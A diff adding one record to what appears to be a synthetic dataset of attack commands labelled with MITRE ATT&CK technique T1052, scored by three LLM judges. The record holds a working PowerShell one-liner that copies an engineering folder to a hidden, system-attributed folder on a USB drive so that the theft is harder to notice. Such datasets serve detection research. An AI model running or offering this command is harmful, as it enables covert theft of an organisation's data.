@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$usb=(Get-Volume | Where-Object {$_.DriveType -eq 'Removable' -and $_.DriveLetter} | Select-Object -First 1 -ExpandProperty DriveLetter)+':\\'; $dst=Join-Path $usb 'System Volume Data'; robocopy 'C:\\Engineering\\Designs' $dst /E /COPY:DAT /DCOPY:T /R:1 /W:1 /XJ /MT:8 > $null; attrib +h +s $dst",
+  "explanation": "Uses robocopy to mirror a directory to a hidden folder on the USB while preserving timestamps and data attributes.",
+  "rationale_steps": [
+    "Identify removable drive",
+    "Copy files with robust robocopy options to USB",
+    "Preserve metadata to reduce anomalies",
+    "Hide destination folder with system/hidden attributes"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-b282912d-b60d4a21",
+  "source_prompt_hash": "b282912d",
+  "timestamp_utc": "2025-09-30T05:30:27.458223Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced quoting and valid robocopy/attrib options, proper pipelining, variable concatenation, and redirection to $null.",
+        "semantic_score": 4,
+        "semantic_justification": "It copies the directory tree to a hidden folder on a removable drive preserving data and timestamps (consistent with T1052), but it does not truly mirror since /MIR is not used.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T07:08:22.229896Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, parentheses, proper variable assignments, pipeline operators, and valid PowerShell/robocopy syntax throughout.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1052 by automatically identifying a removable drive, copying sensitive engineering designs to a hidden system folder on that drive using robocopy with appropriate flags to preserve metadata, and then applying hidden and system attributes to evade casual detection.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T07:08:25.093472Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct Powershell and Windows command syntax, balanced expressions, and valid flags.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely achieves the stated intent of mirroring a directory to a hidden folder on a USB drive with attribute preservation, aligning perfectly with T1052 by staging data onto a physical medium with obfuscation.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T07:08:35.650337Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
